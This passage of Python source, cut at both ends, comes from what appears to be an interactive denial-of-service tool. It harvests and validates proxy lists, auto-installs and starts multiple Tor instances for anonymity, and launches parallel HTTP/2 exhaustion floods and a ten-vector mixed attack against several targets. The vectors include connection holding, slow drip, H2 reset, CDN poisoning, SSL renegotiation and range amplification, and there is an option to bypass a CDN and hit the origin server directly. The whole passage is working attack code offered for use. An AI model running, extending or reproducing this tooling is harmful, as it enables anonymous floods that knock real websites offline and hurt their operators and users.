                elif sel == "M":
                    manual = get_input(" Proxy file path: ").strip()
                    if manual and os.path.exists(manual):
                        files_to_load = [manual]
                else:
                    try:
                        idx = int(sel) - 1
                        if 0 <= idx < len(proxy_files):
                            files_to_load = [proxy_files[idx]]
                    except ValueError:
                        pass

                if files_to_load:
                    from core.network.proxy import ProxyPool
                    pool = ProxyPool(connect_timeout=5)
                    total = 0
                    for f in files_to_load:
                        with open(f, "r") as fp:
                            count = await pool.load(fp.readlines())
                            total += count
                            print(f" {c('g','[+]')} {f}: loaded {count} proxies")
                    print(f" {c('g','[+]')} Total: {total} unique proxies")

                    # Ask if user wants to validate before use
                    if get_input(" Validate proxies before use? (Y/n): ").lower() != "n":
                        # Set check URL based on whether we have auth proxies
                        has_auth = any(ps.url.count("@") > 0 for ps in pool._pending)

                        if has_auth:
                            pool._validator.check_url = "https://ipv4.webshare.io/"
                            print(f" {c('c','[*]')} Auth proxies detected - using https://ipv4.webshare.io/ for validation")
                        else:
                            pool._validator.set_target(target)

                        max_validate = min(total, 3000)
                        max_alive = 500

                        # Ask user what validation mode
                        print(f"\n {c('c','[*]')} Validation mode:")
                        print(f"   {c('c','[1]')} Fast (TCP check only) - 90% pass, 50ms/proxy {c('g','(RECOMMENDED)')}")
                        print(f"   {c('c','[2]')} Strict (TCP + Target HTTP check) - 1-5% pass, 200ms/proxy")
                        validate_mode = get_input(f" Choose [1/2] (default 1): ").strip() or "1"

                        # Ask how many proxies to validate (default 3000, but allow ALL)
                        print(f"\n {c('c','[*]')} How many proxies to validate?")
                        print(f"   {c('c','[1]')} 3000 (fast, ~75s on TCP mode) {c('g','[default]')}")
                        print(f"   {c('c','[2]')} 5000 (~125s)")
                        print(f"   {c('c','[3]')} 10000 (~4 min)")
                        print(f"   {c('c','[A]')} ALL {total} proxies (~{int(total*0.05)}s on TCP mode)")
                        print(f"   {c('c','[M]')} Manual count")
                        scope_choice = get_input(f" Choose [1/2/3/A/M] (default 1): ").strip().upper() or "1"
                        if scope_choice == "1":
                            max_validate = min(total, 3000)
                        elif scope_choice == "2":
                            max_validate = min(total, 5000)
                        elif scope_choice == "3":
                            max_validate = min(total, 10000)
                        elif scope_choice == "A":
                            max_validate = total
                        elif scope_choice == "M":
                            mv = get_input(f" How many proxies to validate (1-{total}): ").strip()
                            try:
                                max_validate = max(1, min(total, int(mv)))
                            except ValueError:
                                max_validate = min(total, 3000)
                        else:
                            max_validate = min(total, 3000)

                        # Also ask early-exit threshold
                        ea = get_input(f" Early-exit when how many alive? (default 500, 0=disable): ").strip()
                        try:
                            max_alive = max(0, int(ea)) if ea else 500
                        except ValueError:
                            max_alive = 500
                        if max_alive == 0:
                            max_alive = max_validate + 1  # never trigger early exit

                        stage1_only = (validate_mode == "1")
                        
                        if stage1_only:
                            print(f" {c('c','[*]')} FAST mode: TCP-only check, 1.5s timeout/proxy")
                            print(f" {c('c','[*]')} Target: {max_validate} proxies, early exit at {max_alive} alive")
                        else:
                            print(f" {c('y','[*]')} STRICT mode: most proxies fail Cloudflare-protected targets")
                            print(f" {c('c','[*]')} Target: {max_validate} proxies, early exit at {max_alive} alive")
                        
                        # Live progress
                        last_print = [0]
                        def progress_cb(stage, current, alive):
                            import time as _t
                            now = _t.time()
                            if now - last_print[0] < 0.3:
                                return
                            last_print[0] = now
                            stage_name = "TCP" if stage == "tcp_check" else "Target"
                            print(f"\r {c('c','[*]')} {stage_name}: {current}/{max_validate} | alive: {c('g',str(alive))}    ", end="", flush=True)
                        
                        alive = await pool.quick_validate(
                            max_validate,
                            concurrency=200,
                            target_specific=not has_auth and not stage1_only,
                            progress_cb=progress_cb,
                            max_alive=max_alive,
                            stage1_only=stage1_only,
                        )
                        print()  # newline after progress
                        print(f" {c('g','[+]')} {alive} proxies alive")

                        if alive > 0:
                            alive_path = "proxies/alive.txt"
                            pool.save_alive(alive_path)
                            print(f" {c('g','[+]')} Saved alive list to: {alive_path}")

                    if pool.stats().get("total", 0) > 0 or pool._pending:
                        options["proxy_pool"] = pool
                        options["proxy_file"] = ", ".join(files_to_load)
                else:
                    print(f" {c('y','[!]')} No file selected")
            else:
                manual = get_input(" Proxy file path (default proxies/alive.txt): ").strip() or "proxies/alive.txt"
                if os.path.exists(manual):
                    from core.network.proxy import ProxyPool
                    pool = ProxyPool(connect_timeout=5)
                    count = await pool.load_file(manual)
                    print(f" {c('g','[+]')} Loaded {count} proxies from {manual}")
                    options["proxy_pool"] = pool
                    options["proxy_file"] = manual
                else:
                    print(f" {c('r','[-]')} File not found: {manual}")

        elif proxy_choice == "2":
            save_path = get_input(" Save to (default proxies/alive.txt): ").strip() or "proxies/alive.txt"
            from core.network.proxy_harvester import auto_harvest_and_validate
            print(f" {c('c','[*]')} Harvesting (30-90s)...")
            last = [0]
            def progress(stage, current, alive):
                import time as _t
                if _t.time() - last[0] < 0.5:
                    return
                last[0] = _t.time()
                if stage == "validate":
                    print(f"\r {c('c','[*]')} Validating: {current} | alive: {c('g',str(alive))}    ", end="", flush=True)
            result = await auto_harvest_and_validate(
                target_url=target, save_path=save_path, min_rtt_ms=3000,
                progress_cb=progress,
            )
            print()
            if result['fast_alive'] > 0:
                from core.network.proxy import ProxyPool
                pool = ProxyPool(connect_timeout=5)
                await pool.load_file(save_path)
                print(f" {c('g','[+]')} {result['fast_alive']} fast proxies ready")
                options["proxy_pool"] = pool
                options["proxy_file"] = save_path
            else:
                print(f" {c('y','[!]')} No fast proxies harvested - attack will go direct")
        elif proxy_choice == "3":
            # Tor network
            print(f"\n {c('c','[*]')} Setting up Tor network...")
            try:
                from core.network.tor_manager import get_tor_manager
                from core.network.proxy import ProxyPool

                # Ask number of instances
                tor_instances = get_input(" Tor instances [1-20] (default 5): ").strip() or "5"
                tor_instances = max(1, min(20, int(tor_instances)))

                # Setup Tor
                manager = get_tor_manager(instances=tor_instances)

                if not manager.is_tor_installed():
                    if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
                        print(f" {c('c','[*]')} Auto-installing Tor...")
                        if not manager.install_tor():
                            print(f" {c('r','[-]')} Tor installation failed")
                        else:
                            print(f" {c('g','[+]')} Tor installed successfully")
                    else:
                        print(f" {c('y','[!]')} Tor not available - attack will go direct")

                if manager.is_tor_installed():
                    manager.setup_instances()
                    success = manager.start_all(wait_bootstrap=False)
                    if success > 0:
                        print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
                        print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
                        # Non-blocking bootstrap wait
                        bootstrapped = [False] * len(manager.instances)
                        for _ in range(120):
                            for idx, inst in enumerate(manager.instances):
                                if not bootstrapped[idx] and inst.pid:
                                    if manager.wait_for_bootstrap(inst, timeout=3):
                                        bootstrapped[idx] = True
                            if all(bootstrapped):
                                break
                            await asyncio.sleep(1)
                        health = await manager.check_all_health()
                        healthy = [h for h in health if h.get('is_tor')]
                        print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
                        for h in healthy:
                            print(f"    Tor#{h['instance_id']} {h['exit_ip']}")

                        if healthy:
                            from core.network.tor_manager import TOR_BASE_SOCKS_PORT
                            from core.network.proxy import ProxyPool
                            proxy_pool = ProxyPool(connect_timeout=10)
                            for h in healthy:
                                socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
                                proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
                            print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
            except Exception as e:
                print(f" {c('r','[-]')} Tor setup error: {e}")
        # else (option 4 or anything else) = no proxies

    return options


# ---------- Multi-target wrappers ----------
async def run_http_flood_multi(targets: List[str], cfg: dict):
    """Multi-target: run http_flood against ALL targets in parallel."""
    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    rps = int(get_input(" Target RPS per target (default 2000): ") or "2000")
    use_tor = get_input(" Route through Tor? (y/N): ").strip().lower() == "y"
    proxy_urls = []
    if use_tor:
        for i in range(3):
            proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
    print(f"  {c('c','[*]')} HTTP Flood Multi: {len(targets)} targets, {duration}s, {rps}RPS each")
    if proxy_urls:
        print(f"  {c('g','[+]')} Tor proxies: {len(proxy_urls)}")
    _rich_sep()
    from core.attack.engines.h2_exhaust import run_h2_exhaust
    import threading as _th

    import queue as _queue
    all_tasks = []
    for target in targets:
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        parsed = urlparse(target)
        host = parsed.hostname or target
        tasks = []
        stop_evts = []
        results = []
        live_q = _queue.Queue()
        killers = [
            ("killer1", 0.30, 4),
            ("killer2", 0.25, 3),
            ("killer3", 0.20, 2),
            ("killer4", 0.15, 2),
            ("killer5", 0.10, 1),
        ]
        for name, share, conns in killers:
            wrps = max(1000, int(rps * share))
            evt = _th.Event()
            res = {}
            th = _th.Thread(
                target=run_h2_exhaust,
                name=f"multi_{host}_{name}",
                kwargs=dict(
                    target_url=target, rps=wrps,
                    duration=float(duration), worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
                    stats_queue=live_q, stop_event=evt,
                    host_header=host, connections=conns,
                    result_dict=res,
                ),
                daemon=True,
            )
            th.start()
            tasks.append(th)
            stop_evts.append(evt)
            results.append(res)
        all_tasks.append((target, tasks, stop_evts, results, live_q))

    # Monitor progress with live stats from queues
    _live = {url: {"sent": 0, "ok": 0, "fail": 0, "held": 0} for url in targets}
    print(f"  {c('c','[*]')} Attacking {len(targets)} targets simultaneously...")
    start_t = time.time()
    try:
        while time.time() - start_t < duration + 5:
            remain = int(duration - (time.time() - start_t))
            if remain <= 0:
                break
            # Drain live queues
            for target, _, _, _, q in all_tasks:
                try:
                    while True:
                        snap = q.get_nowait()
                        if isinstance(snap, dict):
                            _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
                            _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
                            _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
                            _live[target]["held"] = max(_live[target]["held"], int(snap.get("connections_held", 0)))
                except _queue.Empty:
                    pass
            # Build display lines
            lines = []
            total_sent = total_ok = total_fail = 0
            for target, tasks, _, results, _ in all_tasks:
                s = _live[target]
                alive = sum(1 for t in tasks if t.is_alive())
                status = f"{c('g','RUN')}" if alive else f"{c('r','DONE')}"
                lines.append(f"    {c('w',target[:55]):55s} {status}  sent={s['sent']:>5d}  ok={s['ok']:>5d}  fail={s['fail']:>4d}  held={s['held']:>3d}")
                total_sent += s['sent']
                total_ok += s['ok']
                total_fail += s['fail']
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.write(f"\n  {c('c','=== HTTP FLOOD MULTI-TARGET ===')}  [{remain}s remaining]  total_sent={total_sent}  ok={total_ok}  fail={total_fail}\n\n")
            sys.stdout.write("\n".join(lines))
            sys.stdout.write(f"\n\n  {c('d','Press Ctrl+C to stop')}")
            sys.stdout.flush()
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {c('y','[!]')} Stopping...")

    # Drain remaining queue data before stop
    for target, _, _, _, q in all_tasks:
        try:
            while True:
                snap = q.get_nowait()
                if isinstance(snap, dict):
                    _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
                    _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
                    _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
        except _queue.Empty:
            pass

    # Cleanup
    for target, tasks, evts, results, _ in all_tasks:
        for e in evts:
            e.set()
        for t in tasks:
            t.join(timeout=3)
    
    # Also read final result dicts
    for target, _, _, results, _ in all_tasks:
        for r in results:
            _live[target]["sent"] = max(_live[target]["sent"], int(r.get("sent", 0)))
            _live[target]["ok"] = max(_live[target]["ok"], int(r.get("completed", 0)))
            _live[target]["fail"] = max(_live[target]["fail"], int(r.get("failed", 0)))
    
    # Print results
    sys.stdout.write("\033[2J\033[H")
    print(f"\n  {c('c','=== HTTP FLOOD MULTI-TARGET RESULTS ===')}\n")
    total_sent = total_ok = total_fail = 0
    for target, _, _, _, _ in all_tasks:
        s = _live[target]
        total_sent += s['sent']
        total_ok += s['ok']
        total_fail += s['fail']
        print(f"  {c('w',target[:55]):55s}  sent={s['sent']:>6d}  ok={s['ok']:>6d}  fail={s['fail']:>5d}")
    print(f"  {'-' * 55}  {'-'*20}")
    print(f"  {c('g','TOTAL'):55s}  sent={total_sent:>6d}  ok={total_ok:>6d}  fail={total_fail:>5d}")
    _rich_sep()


# ---------- Mixed Attack multi-target ----------
async def run_mixed_attack_multi(targets: List[str], cfg: dict):
    """Multi-target: mixed attack with ALL vectors against ALL targets in parallel."""
    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    rps = int(get_input(" Target RPS per target (default 2000): ") or "2000")

    print()
    print(f" {c('c','[*]')} Attack mode:")
    print(f"   {c('c','[1]')} Direct (no Tor / no proxy) {c('g','[fastest]')}")
    print(f"   {c('c','[2]')} Tor network {c('g','[recommended]')}")
    print(f"   {c('c','[3]')} Proxy pool")
    print(f"   {c('c','[4]')} Tor + Proxy")
    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")

    use_tor = mode in ("2", "4")
    use_proxy = mode in ("3", "4")
    proxy_urls = []

    if use_tor:
        ti = get_input(" Tor instances (default 5): ").strip()
        tor_instances = max(1, min(20, int(ti))) if ti.isdigit() else 5
        try:
            from core.network.tor_manager import get_tor_manager, TOR_BASE_SOCKS_PORT
            manager = get_tor_manager(instances=tor_instances)
            if manager.is_tor_installed():
                manager.setup_instances()
                success = manager.start_all(wait_bootstrap=False)
                if success > 0:
                    print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
                    print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
                    bootstrapped = [False] * len(manager.instances)
                    for _ in range(120):
                        for idx, inst in enumerate(manager.instances):
                            if not bootstrapped[idx] and inst.pid:
                                if manager.wait_for_bootstrap(inst, timeout=3):
                                    bootstrapped[idx] = True
                        if all(bootstrapped):
                            break
                        await asyncio.sleep(1)
                    health = await manager.check_all_health()
                    healthy = [h for h in health if h.get('is_tor')]
                    print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
                    if healthy:
                        for h in healthy:
                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
                            proxy_urls.append(f"socks5h://127.0.0.1:{socks_port}")
        except ImportError:
            for i in range(min(tor_instances, 5)):
                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
        except Exception as e:
            print(f" {c('r','[-]')} Tor setup error: {e}")
            for i in range(min(tor_instances, 5)):
                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")

    if use_proxy:
        try:
            opts = await prompt_attack_options(targets[0], ask_proxy=True, ask_origin=False)
            pool = opts.get("proxy_pool")
            if pool is not None:
                for plist in getattr(pool, "_pools", {}).values():
                    for ps in plist:
                        u = getattr(ps, "url", None)
                        if u:
                            proxy_urls.append(u)
                for ps in getattr(pool, "_pending", []) or []:
                    u = getattr(ps, "url", None)
                    if u:
                        proxy_urls.append(u)
        except Exception as e:
            print(f" {c('y','[!]')} proxy setup: {e}")

    print(f"  {c('c','[*]')} Mixed Attack Multi: {len(targets)} targets, {duration}s, {rps}RPS each, proxies={len(proxy_urls)}")
    _rich_sep()

    from core.monitor.auto_dashboard import AutoDashboard
    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
    import threading as _th
    import queue as _queue

    vectors = [
        ("mv_connhold",   "connhold",   0.08),
        ("mv_flood",      "flood",      0.22),
        ("mv_post",       "post",       0.15),
        ("mv_slow",       "slow",       0.05),
        ("mv_h2reset",    "h2reset",    0.18),
        ("mv_drip",       "drip",       0.06),
        ("mv_cdnpoison",  "cdnpoison",  0.10),
        ("mv_resexh",     "resexh",     0.08),
        ("mv_sslreneg",   "sslreneg",   0.04),
        ("mv_rangeamp",   "rangeamp",   0.04),
    ]

    all_tasks = []
    for target in targets:
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        parsed = urlparse(target)
        host = parsed.hostname or target
        tasks = []
        stop_evts = []
        results = []
        live_q = _queue.Queue()
        for name, mode, share in vectors:
            wrps = max(50, int(rps * share))
            evt = _th.Event()
            res = {}
            th = _th.Thread(
                target=run_multi_vector_engine,
                name=f"multi_mixed_{host}_{name}",
                kwargs=dict(
                    target_url=target,
                    duration_seconds=float(duration),
                    target_rps=wrps,
                    worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
                    stats_queue=live_q,
                    stop_event=evt,
                    proxy_urls=proxy_urls if proxy_urls else None,
                    result_dict=res,
                    vector_mode=mode,
                ),
                daemon=True,
            )
            th.start()
            tasks.append(th)
            stop_evts.append(evt)
            results.append(res)
        all_tasks.append((target, tasks, stop_evts, results, live_q))

    _live = {url: {"sent": 0, "ok": 0, "fail": 0} for url in targets}
    print(f"  {c('c','[*]')} Attacking {len(targets)} targets simultaneously (10 vectors each)...")
    start_t = time.time()
    try:
        while time.time() - start_t < duration + 5:
            remain = int(duration - (time.time() - start_t))
            if remain <= 0:
                break
            for target, _, _, _, q in all_tasks:
                try:
                    while True:
                        snap = q.get_nowait()
                        if isinstance(snap, dict):
                            _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
                            _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
                            _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
                except _queue.Empty:
                    pass
            lines = []
            total_sent = total_ok = total_fail = 0
            for target, tasks, _, _, _ in all_tasks:
                s = _live[target]
                alive = sum(1 for t in tasks if t.is_alive())
                status = f"{c('g','RUN')}" if alive else f"{c('r','DONE')}"
                lines.append(f"    {c('w',target[:55]):55s} {status}  sent={s['sent']:>5d}  ok={s['ok']:>5d}  fail={s['fail']:>4d}")
                total_sent += s['sent']
                total_ok += s['ok']
                total_fail += s['fail']
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.write(f"\n  {c('c','=== MIXED ATTACK MULTI-TARGET ===')}  [{remain}s]  sent={total_sent}  ok={total_ok}  fail={total_fail}\n\n")
            sys.stdout.write("\n".join(lines))
            sys.stdout.write(f"\n\n  {c('d','Press Ctrl+C to stop')}")
            sys.stdout.flush()
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {c('y','[!]')} Stopping...")

    for target, _, _, _, q in all_tasks:
        try:
            while True:
                snap = q.get_nowait()
                if isinstance(snap, dict):
                    _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
                    _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
                    _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
        except _queue.Empty:
            pass

    for _, tasks, evts, results, _ in all_tasks:
        for e in evts:
            e.set()
        for t in tasks:
            t.join(timeout=3)

    for target, _, _, results, _ in all_tasks:
        for r in results:
            _live[target]["sent"] = max(_live[target]["sent"], int(r.get("sent", 0)))
            _live[target]["ok"] = max(_live[target]["ok"], int(r.get("completed", 0)))
            _live[target]["fail"] = max(_live[target]["fail"], int(r.get("failed", 0)))

    sys.stdout.write("\033[2J\033[H")
    print(f"\n  {c('c','=== MIXED ATTACK MULTI-TARGET RESULTS ===')}\n")
    total_sent = total_ok = total_fail = 0
    for target, _, _, _, _ in all_tasks:
        s = _live[target]
        total_sent += s['sent']
        total_ok += s['ok']
        total_fail += s['fail']
        print(f"  {c('w',target[:55]):55s}  sent={s['sent']:>6d}  ok={s['ok']:>6d}  fail={s['fail']:>5d}")
    print(f"  {'-' * 55}  {'-'*20}")
    print(f"  {c('g','TOTAL'):55s}  sent={total_sent:>6d}  ok={total_ok:>6d}  fail={total_fail:>5d}")
    _rich_sep()


# ---------- Auto Mode multi-target ----------
async def run_auto_mode_multi(targets: List[str], cfg: dict):
    """Multi-target: auto mode against ALL targets in parallel."""
    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    rps = int(get_input(" Target RPS per target (default 2000): ") or "2000")

    print()
    print(f" {c('c','[*]')} Attack mode:")
    print(f"   {c('c','[1]')} Direct (no Tor / no proxy) {c('g','[fastest]')}")
    print(f"   {c('c','[2]')} Tor network {c('g','[recommended]')}")
    print(f"   {c('c','[3]')} Proxy pool")
    print(f"   {c('c','[4]')} Tor + Proxy")
    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")

    use_tor = mode in ("2", "4")
    use_proxy = mode in ("3", "4")
    proxy_urls = []

    if use_tor:
        ti = get_input(" Tor instances (default 5): ").strip()
        tor_instances = max(1, min(20, int(ti))) if ti.isdigit() else 5
        try:
            from core.network.tor_manager import get_tor_manager, TOR_BASE_SOCKS_PORT
            manager = get_tor_manager(instances=tor_instances)
            if manager.is_tor_installed():
                manager.setup_instances()
                success = manager.start_all(wait_bootstrap=False)
                if success > 0:
                    print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
                    print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
                    bootstrapped = [False] * len(manager.instances)
                    for _ in range(120):
                        for idx, inst in enumerate(manager.instances):
                            if not bootstrapped[idx] and inst.pid:
                                if manager.wait_for_bootstrap(inst, timeout=3):
                                    bootstrapped[idx] = True
                        if all(bootstrapped):
                            break
                        await asyncio.sleep(1)
                    health = await manager.check_all_health()
                    healthy = [h for h in health if h.get('is_tor')]
                    print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
                    if healthy:
                        for h in healthy:
                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
                            proxy_urls.append(f"socks5h://127.0.0.1:{socks_port}")
        except ImportError:
            for i in range(min(tor_instances, 5)):
                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
        except Exception as e:
            print(f" {c('r','[-]')} Tor setup error: {e}")
            for i in range(min(tor_instances, 5)):
                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")

    if use_proxy:
        try:
            opts = await prompt_attack_options(targets[0], ask_proxy=True, ask_origin=False)
            pool = opts.get("proxy_pool")
            if pool is not None:
                for plist in getattr(pool, "_pools", {}).values():
                    for ps in plist:
                        u = getattr(ps, "url", None)
                        if u:
                            proxy_urls.append(u)
                for ps in getattr(pool, "_pending", []) or []:
                    u = getattr(ps, "url", None)
                    if u:
                        proxy_urls.append(u)
        except Exception as e:
            print(f" {c('y','[!]')} proxy setup: {e}")

    print(f"  {c('c','[*]')} Auto Mode Multi: {len(targets)} targets, {duration}s, {rps}RPS each, proxies={len(proxy_urls)}")
    _rich_sep()

    from core.monitor.auto_dashboard import AutoDashboard
    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
    import threading as _th
    import queue as _queue

    vectors = [
        ("mv_flood",      "flood",      0.25),
        ("mv_post",       "post",       0.20),
        ("mv_resexh",     "resexh",     0.15),
        ("mv_cdnpoison",  "cdnpoison",  0.12),
        ("mv_h2reset",    "h2reset",    0.12),
        ("mv_connhold",   "connhold",   0.08),
        ("mv_drip",       "drip",       0.04),
        ("mv_rangeamp",   "rangeamp",   0.04),
    ]

    all_tasks = []
    for target in targets:
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        parsed = urlparse(target)
        host = parsed.hostname or target
        tasks = []
        stop_evts = []
        results = []
        live_q = _queue.Queue()
        for name, mode, share in vectors:
            wrps = max(50, int(rps * share))
            evt = _th.Event()
            res = {}
            th = _th.Thread(
                target=run_multi_vector_engine,
                name=f"multi_auto_{host}_{name}",
                kwargs=dict(
                    target_url=target,
                    duration_seconds=float(duration),
                    target_rps=wrps,
                    worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
                    stats_queue=live_q,
                    stop_event=evt,
                    proxy_urls=proxy_urls if proxy_urls else None,
                    result_dict=res,
                    vector_mode=mode,
                ),
                daemon=True,
            )
            th.start()
            tasks.append(th)
            stop_evts.append(evt)
            results.append(res)
        all_tasks.append((target, tasks, stop_evts, results, live_q))

    _live = {url: {"sent": 0, "ok": 0, "fail": 0} for url in targets}
    print(f"  {c('c','[*]')} Attacking {len(targets)} targets simultaneously (8 vectors each)...")
    start_t = time.time()
    try:
        while time.time() - start_t < duration + 5:
            remain = int(duration - (time.time() - start_t))
            if remain <= 0:
                break
            for target, _, _, _, q in all_tasks:
                try:
                    while True:
                        snap = q.get_nowait()
                        if isinstance(snap, dict):
                            _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
                            _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
                            _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
                except _queue.Empty:
                    pass
            lines = []
            total_sent = total_ok = total_fail = 0
            for target, tasks, _, _, _ in all_tasks:
                s = _live[target]
                alive = sum(1 for t in tasks if t.is_alive())
                status = f"{c('g','RUN')}" if alive else f"{c('r','DONE')}"
                lines.append(f"    {c('w',target[:55]):55s} {status}  sent={s['sent']:>5d}  ok={s['ok']:>5d}  fail={s['fail']:>4d}")
                total_sent += s['sent']
                total_ok += s['ok']
                total_fail += s['fail']
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.write(f"\n  {c('c','=== AUTO MODE MULTI-TARGET ===')}  [{remain}s]  sent={total_sent}  ok={total_ok}  fail={total_fail}\n\n")
            sys.stdout.write("\n".join(lines))
            sys.stdout.write(f"\n\n  {c('d','Press Ctrl+C to stop')}")
            sys.stdout.flush()
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {c('y','[!]')} Stopping...")

    for target, _, _, _, q in all_tasks:
        try:
            while True:
                snap = q.get_nowait()
                if isinstance(snap, dict):
                    _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
                    _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
                    _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
        except _queue.Empty:
            pass

    for _, tasks, evts, results, _ in all_tasks:
        for e in evts:
            e.set()
        for t in tasks:
            t.join(timeout=3)

    for target, _, _, results, _ in all_tasks:
        for r in results:
            _live[target]["sent"] = max(_live[target]["sent"], int(r.get("sent", 0)))
            _live[target]["ok"] = max(_live[target]["ok"], int(r.get("completed", 0)))
            _live[target]["fail"] = max(_live[target]["fail"], int(r.get("failed", 0)))

    sys.stdout.write("\033[2J\033[H")
    print(f"\n  {c('c','=== AUTO MODE MULTI-TARGET RESULTS ===')}\n")
    total_sent = total_ok = total_fail = 0
    for target, _, _, _, _ in all_tasks:
        s = _live[target]
        total_sent += s['sent']
        total_ok += s['ok']
        total_fail += s['fail']
        print(f"  {c('w',target[:55]):55s}  sent={s['sent']:>6d}  ok={s['ok']:>6d}  fail={s['fail']:>5d}")
    print(f"  {'-' * 55}  {'-'*20}")
    print(f"  {c('g','TOTAL'):55s}  sent={total_sent:>6d}  ok={total_ok:>6d}  fail={total_fail:>5d}")
    _rich_sep()


async def run_http_flood(target: str, cfg: dict):
    """HTTP Flood with multi-vector engine + LIVE DASHBOARD (matches Module 9 quality)"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
    rps = int(get_input(" Target RPS (default 10000): ") or "10000")

    opts = await prompt_attack_options(target)

    # Resolve effective target (origin bypass if available)
    effective_url = target
    if opts.get("origin_ip"):
        parsed = urlparse(target)
        scheme = parsed.scheme or "https"
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        effective_url = f"{scheme}://{opts['origin_ip']}{path}"

    print(f"\n {c('c','[*]')} HTTP Flood | {target} | {duration}s | {rps} RPS")
    if opts.get("origin_ip"):
        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']} (Host: {host_header})")
    if opts.get("proxy_pool"):
        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
    _rich_sep()

    # Build proxy URL list for the multi-vector engine
    proxy_urls = []
    if opts.get("proxy_pool") is not None:
        try:
            for plist in opts["proxy_pool"]._pools.values():
                for ps in plist:
                    u = getattr(ps, "url", None) or (ps if isinstance(ps, str) else None)
                    if u:
                        proxy_urls.append(u)
            if not proxy_urls:
                for ps in getattr(opts["proxy_pool"], "_pending", []) or []:
                    u = getattr(ps, "url", None) or (ps if isinstance(ps, str) else None)
                    if u:
                        proxy_urls.append(u)
        except Exception:
            proxy_urls = []

    # Resolve host_header for origin bypass (SNI + HTTP Host header)
    parsed_target = urlparse(target)
    host_header = opts.get("host_header") or parsed_target.hostname or ""

    # Spin up the AutoDashboard for live per-vector RPS rendering.
    from core.monitor.auto_dashboard import AutoDashboard
    from core.attack.engines.h2_exhaust import run_h2_exhaust
    from core.attack.engines.h2_hold_engine import run_hold_worker
    import threading as _th
    import queue as _queue

    dash = AutoDashboard(
        target=effective_url, duration=duration,
        target_rps=rps, stalled_ms=8000, refresh_ms=50,
    )
    vectors = [
        ("killer_1", "H2 Exhaust", 0.25, 4),
        ("killer_2", "H2 Exhaust", 0.25, 4),
        ("killer_3", "H2 Exhaust", 0.20, 3),
        ("killer_4", "H2 Exhaust", 0.20, 3),
        ("killer_5", "H2 Exhaust", 0.10, 2),
    ]
    for name, label, _share, _conns in vectors:
        dash.register_vector(name, label)

    dash.set_engine_label("H2 Exhaust v3")
    dash.set_global_note(f"origin={opts.get('origin_ip','-')}")
    dash.start()

    handles = []
    for name, label, share, conns in vectors:
        wrps = max(1000, int(rps * share))
        stop_evt = _th.Event()
        result: dict = {}
        proxy_q = dash.get_stats_queue()

        class _Proxy:
            def __init__(self, vn):
                self.vn = vn
            def put_nowait(self, item):
                if isinstance(item, dict):
                    item["vector_name"] = self.vn
                proxy_q.put_nowait(item)
            def get_nowait(self):
